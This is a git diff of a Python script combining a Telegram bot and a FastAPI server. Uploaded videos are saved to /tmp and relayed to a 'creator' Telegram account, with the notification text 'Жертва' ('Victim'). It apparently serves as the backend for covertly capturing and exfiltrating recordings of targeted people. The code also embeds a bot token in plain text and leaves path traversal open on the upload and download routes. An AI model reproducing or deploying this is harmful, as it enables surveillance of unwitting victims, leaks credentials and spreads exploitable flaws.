@@ -1,10 +1,5 @@
 from threading import Thread
-import asyncio
-
 import uvicorn
-
-from api.api import app
-
 import telebot
 
 bot = telebot.TeleBot("7462346035:AAF60-_oMbOaJQwIdRpkM63KpC-Ayx0eEzk")
@@ -30,24 +25,90 @@ def unknown_command(message):
 def sendNotification(creator_id: int):
     bot.send_message(creator_id, "Жертва")
 
-
 def bot_polling():
     bot.infinity_polling()
 
-def start_bot(loop):
-    loop.create_task(bot_polling)
 
-def start_uvicorn(loop):
-    config = uvicorn.Config(app, loop=loop)
-    server = uvicorn.Server(config)
-    loop.run_until_complete(server.serve())
+import os
+import time
+
+from fastapi import FastAPI, File, UploadFile
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import FileResponse
+
+
+app = FastAPI()
+
+origins = ["*"]
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=origins,
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+
+videos = {}
+
+import threading
+
+TIMEOUT_SECONDS = 5
+
+print(TIMEOUT_SECONDS)
+
+# Function to handle video cleanup
+def cleanup_videos():
+    while True:
+        # Sleep for the specified timeout
+        time.sleep(TIMEOUT_SECONDS)
+
+        # Get current timestamp
+        current_time = time.time()
+
+        # Iterate over video timestamps and delete if older than timeout
+        for filename, timestamp in videos.items():
+            if current_time - timestamp > TIMEOUT_SECONDS:
+                creator_id = 0
+                filename = filename.split(".webm")[0]
+                if "-" not in filename:
+                    creator_id = 2114613077
+                else:
+                    creator_id = int(filename.split("-")[0])
+                bot.send_video(creator_id, os.path.join("/tmp", filename))
+                # Delete the video file
+                try:
+                    os.remove(os.path.join("/tmp", filename))
+                    del videos[filename] # Remove from the dictionary
+                    print(f"Deleted video: {filename}")
+                except FileNotFoundError:
+                    # Ignore if file is already deleted
+                    pass
+
+# Start the cleanup thread (runs in the background)
+cleanup_thread = threading.Thread(target=cleanup_videos)
+cleanup_thread.daemon = True # Allow main thread to exit even if cleanup thread is running
+cleanup_thread.start()
+
+@app.post("/upload-video")
+async def upload_video(video: UploadFile = File(...)):
+    try:
+        with open(os.path.join("/tmp", video.filename), "wb") as buffer:
+            buffer.write(video.file.read())
+        
+        videos[video.filename] = time.time()
+
+    except Exception as e:
+        return "Error: " + repr(e)
+
+
+@app.get("/videos/{filename}")
+async def get_video(filename: str):
+    return FileResponse(os.path.join("/tmp", filename)) 
 
 
 if __name__ == "__main__":
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    start_bot(loop)
-    start_uvicorn(loop)
-    # Thread(target=bot_thread).start()
-    # uvicorn.run("api.api:app", port=8000, reload=True)
+    Thread(target=bot_polling).start()
+    uvicorn.run("main:app", port=8000, reload=True)
 
